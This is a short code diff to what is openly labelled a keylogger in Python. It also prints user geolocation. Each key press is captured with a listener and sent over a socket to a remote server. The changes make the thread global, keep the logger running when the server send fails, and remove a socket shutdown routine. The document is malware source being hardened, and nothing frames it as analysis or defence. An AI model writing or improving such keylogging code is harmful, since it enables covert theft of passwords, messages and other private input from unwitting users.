@@ -12,6 +12,7 @@ print(USER_GEOLOCATION[24:-2])
 
 #! Listens for key presses and sends them to the server
 def start_keylogger():
+        global keyThread
         keyThread = threading.Thread(target=create_keylogger)
         keyThread.daemon = True
         keyThread.start()
@@ -27,12 +28,13 @@ def create_keylogger():
             time.sleep(0.1)
             def on_press(key):
                 string =f"{key}"
-                s.send(bytes(string, 'utf-8'))
-                
+                try:    s.send(bytes(string, 'utf-8'))
+                except: 
+                    print("\nServer keylogger is down.\n")
+                    time.sleep(5)
+                    
             while True:
                 print("Starting logger.")
                 with Listener(on_press=on_press) as listener:
                     listener.join()
-    def shutdownSock():
-        s.shutdown(socket.SHUT_RDWR)
-        s.close()
+
